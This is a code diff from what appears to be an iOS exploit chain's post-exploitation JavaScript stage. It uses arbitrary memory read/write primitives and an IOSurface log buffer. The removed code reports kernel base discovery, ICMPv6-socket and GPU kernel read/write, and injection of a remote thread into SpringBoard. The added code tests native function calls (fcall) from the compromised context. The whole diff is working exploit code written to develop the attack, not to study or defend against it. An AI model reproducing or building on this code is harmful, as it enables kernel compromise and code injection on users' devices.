@@ -1,91 +1,70 @@
-// PE main - reads pre-computed results from IOSurface
-let fob = uread64(addrof(func_offsets_array) + 0x10n);
-let surf = uread64(fob + 19n * 8n);
-let slog = surf + 0xF000n;
-let slop = surf + 0xF000n + 0xE00n;
+// PE main - minimal: just test fcall_init
+// IOSurface direct-write logging for immediate visibility
+globalThis.pw = function() {};
+globalThis._surf = 0n;
+globalThis._log_offset_ptr = 0n;
 
-function pw(msg) {
-  let cs = get_cstring(msg + "\n");
-  let off = uread64(slop);
-  let n = 0n;
-  for (let i = 0n; i < 200n && off + i < 0xE00n - 1n; i++) {
-    let ch = uread8(cs + i);
-    if (ch == 0n) break;
-    uwrite8(slog + off + i, ch);
-    n = i + 1n;
+// Initialize IOSurface logging before any fcall
+try {
+  // Read surface_address_remote from func_offsets[19]
+  // func_offsets_array is a global defined by pe_stage_1
+  let _fob_addr = addrof(func_offsets_array) + 0x10n;
+  let _surf = uread64(_fob_addr + 19n * 8n);
+  if (_surf && _surf != 0n) {
+    globalThis._surf = _surf;
+    globalThis._log_offset_ptr = _surf + 0xFE00n;
   }
-  uwrite64(slop, off + n);
+} catch(e) {
+  // If we can't read func_offsets_array, IOSurface logging won't work
+  // but at least we caught it before fcall_init
 }
 
-pw("[PE] A: start");
+function iosurf_log(msg) {
+  if (!globalThis._surf || globalThis._surf == 0n) return;
+  try {
+    let off = uread64(globalThis._log_offset_ptr);
+    // Check bounds (max 0xE00 bytes total)
+    if (off + 256n >= 0xE00n) return;
 
-let our_pid = uread64(surf + 0xF830n);
-pw("[PE] B: pid=" + our_pid);
-
-let plist_buf = uread64(surf + 0xF838n);
-let plist_count = uread64(surf + 0xF840n);
-let sb_pid = uread64(surf + 0xF848n);
-pw("[PE] C: cnt=" + plist_count + " sb=" + sb_pid);
-
-if (sb_pid != 0n) {
-  pw("[PE] D: SpringBoard PID=" + sb_pid);
-} else {
-  pw("[PE] D: SpringBoard not found yet");
-  // Dump a few more PIDs
-  if (plist_buf != 0n && plist_count > 0n) {
-    let num = plist_count / 4n;
-    let pids = [];
-    for (let i = 0n; i < num && i < 30n; i++) {
-      let addr = plist_buf + i * 4n;
-      let aligned = addr & ~7n;
-      let val = uread64(aligned);
-      let shift = (addr - aligned) * 8n;
-      let p = (val >> shift) & 0xFFFFFFFFn;
-      if (p == 0n) continue;
-      pids.push("["+i+"]="+p);
+    for (let i = 0n; i < BigInt(msg.length); i++) {
+      uwrite8(globalThis._surf + 0xF000n + off + i, BigInt(msg.charCodeAt(Number(i))));
     }
-    pw("[PE] E: first 30: " + pids.join(" "));
+    // Append newline
+    uwrite8(globalThis._surf + 0xF000n + off + BigInt(msg.length), 0x0an);
+    // Update offset pointer
+    uwrite64(globalThis._log_offset_ptr, off + BigInt(msg.length) + 1n);
+  } catch(e2) {
+    // Silent fail - at least we tried
   }
 }
 
-// M5: Read kernel r/w status and kernel base
-let m5_sock_fd = uread64(surf + 0xF850n);
-let m5_rw_fd = uread64(surf + 0xF858n);
-let kernel_base = uread64(surf + 0xF870n);
-if (m5_sock_fd != 0n && m5_sock_fd != -1n) {
-  pw("[PE] M5: ICMPv6 sockets ready ctl=" + m5_sock_fd + " rw=" + m5_rw_fd);
-} else {
-  pw("[PE] M5: ICMPv6 sockets NOT ready (status=" + m5_sock_fd + ")");
-}
-pw("[PE] M5: kernel_base candidate=" + kernel_base.hex());
+// pw writes to IOSurface IMMEDIATELY - works before fcall_init
+globalThis.pw = function(s) {
+  iosurf_log("[PE] " + (s || ""));
+};
 
-// M6: Read SpringBoard injection status
-let m6_remote_addr = uread64(surf + 0xF878n);
-let m6_sb_port = uread64(surf + 0xF880n);
-if (m6_remote_addr != 0n) {
-  pw("[PE] M6: SpringBoard injection ready addr=" + m6_remote_addr.hex() + " port=" + m6_sb_port.hex());
-} else {
-  pw("[PE] M6: SpringBoard injection NOT ready");
-}
+pw("START: pe_main_minimal.js executing");
 
-// M7: Read remote thread status
-let m7_thread_port = uread64(surf + 0xF888n);
-if (m7_thread_port != 0n) {
-  pw("[PE] M7: Remote thread running in SpringBoard port=" + m7_thread_port.hex());
-} else {
-  pw("[PE] M7: Remote thread NOT running");
-}
-
-// Try GPU kernel r/w fallback if M5 sockets failed
-if (m5_sock_fd == -1n) {
-  pw("[PE] M5-FB: Attempting GPU kernel r/w via gpuRead64/gpuWrite64...");
-  // gpuRead64/gpuWrite64 are available in pe_stage_1 context via read64/write64
-  // Test with known kernel address
-  if (typeof read64 !== 'undefined') {
-    let test_kaddr = kernel_base + 0x200000n; // somewhere in kernel region
-    pw("[PE] M5-FB: Testing gpuRead64 at " + test_kaddr.hex() + "...");
-    // This should read 0 or some kernel data (depends on GPU IOMMU access)
+try {
+  fcall_init();
+  pw("fcall_init OK");
+  // Now also set print as secondary output (writes to log_buffer + syslog)
+  let _old_pw = globalThis.pw;
+  globalThis.pw = function(s) {
+    _old_pw(s);           // IOSurface (immediate visibility)
+    try { print(s); } catch(e) {} // log_buffer + syslog (persistent)
+  };
+  let pid = fcall(func_resolve("getpid"));
+  pw("getpid() = " + pid);
+} catch(e) {
+  pw("FAILED: " + (e.message || e));
+  try {
+    // Last attempt: try print directly
+    globalThis.pw = print;
+    pw("FAILED(print): " + (e.message || e));
+  } catch(e2) {
+    pw("FAILED(print also failed)");
   }
 }
 
-pw("[PE] DONE");
+pw("DONE");
